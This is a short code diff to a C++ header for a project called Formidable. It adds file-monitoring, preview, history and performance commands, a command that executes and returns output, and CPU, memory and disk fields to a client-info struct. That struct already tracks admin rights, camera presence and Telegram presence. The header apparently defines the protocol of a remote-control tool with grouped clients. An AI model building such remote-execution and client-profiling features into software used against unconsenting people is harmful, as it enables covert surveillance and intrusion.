@@ -41,6 +41,10 @@ namespace Formidable {
         CMD_FILE_SEARCH = 31,   // 文件搜索
         CMD_FILE_COMPRESS = 32, // 压缩文件
         CMD_FILE_UNCOMPRESS = 33, // 解压文件
+        CMD_FILE_MONITOR = 34,  // 文件监控
+        CMD_FILE_PREVIEW = 35,  // 文件预览
+        CMD_FILE_HISTORY = 36,  // 文件历史记录
+        CMD_FILE_PERF = 37,     // 性能监控
         
         // 进程管理 (40-49)
         CMD_PROCESS_LIST = 40,  // 获取进程列表
@@ -109,6 +113,7 @@ namespace Formidable {
         // 群控专用命令
         CMD_SET_GROUP = 105,    // 设置客户端分组
         CMD_MESSAGEBOX = 106,   // 弹出消息框
+        CMD_EXEC_GET_OUTPUT = 107, // 执行命令并获取输出
         
         CMD_EXIT = 999          // 退出
     };
@@ -214,6 +219,9 @@ namespace Formidable {
         int32_t isAdmin;
         int32_t hasCamera;
         int32_t hasTelegram;
+        float cpuLoad;          // CPU Usage %
+        uint64_t memUsage;      // Memory Usage (bytes)
+        float diskUsage;        // Disk Usage % (C:)
         int32_t clientType;     // 客户端类型
         wchar_t remark[256];    // 客户端备注
         wchar_t group[128];     // 客户端分组
